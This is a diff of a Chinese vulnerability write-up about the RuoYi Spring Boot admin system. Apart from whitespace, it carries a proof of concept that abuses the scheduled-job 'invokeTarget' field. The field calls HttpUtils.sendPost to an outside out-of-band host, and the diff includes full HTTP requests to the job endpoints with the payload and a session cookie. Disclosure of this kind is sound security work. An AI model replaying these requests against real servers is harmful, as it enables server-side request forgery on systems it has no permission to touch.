@@ -14,7 +14,7 @@ sdfd
 				
 				  
   
-   
+   
   
 01  
   
@@ -26,14 +26,14 @@ sdfd
   
 - 项目名称：若依  
   
-- 项目地址：  
+- 项目地址：  
 ```
 https://gitee.com/y_project/RuoYi
 ```  
   
 - 项目描述：基于SpringBoot的权限管理系统 易读易懂、界面简洁美观。核心技术采用Spring、MyBatis、Shiro没有任何其它重度依赖。直接运行即可用  
   
-   
+   
   
 02  
   
@@ -61,7 +61,7 @@ https://gitee.com/y_project/RuoYi/blob/master/ruoyi-common/src/main/java/com/ruo
 				
 				  
   
- POC：  
+ POC：  
 ```
 com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp://6a928e83f9.ipv6.1433.eu.org','')
 ```  
@@ -77,8 +77,8 @@ Accept: application/json, text/javascript, */*; q=0.01
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
 sec-ch-ua-mobile: ?0
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
-Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4
 
 jobId=102&updateBy=admin&jobName=test&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp%3A%2F%2F6a928e83f9.ipv6.1433.eu.org'%2C'')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=1&remark=
 ```  
@@ -92,7 +92,7 @@ Accept: application/json, text/javascript, */*; q=0.01
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
 sec-ch-ua-mobile: ?0
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
 Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4
 
 
@@ -110,7 +110,7 @@ createBy=admin&jobName=test1&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.util
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMsZEcQz3fKRKuTYRsgeqJnBHESLBYSHFeBuoT5WWk5U2HVqKKGjnV3VsIge4SzG3micWrV8zVIUUag/640?wx_fmt=png&from=appmsg&random=0.3613715179024466 "")  
   
-   
+   
   
 04  
   
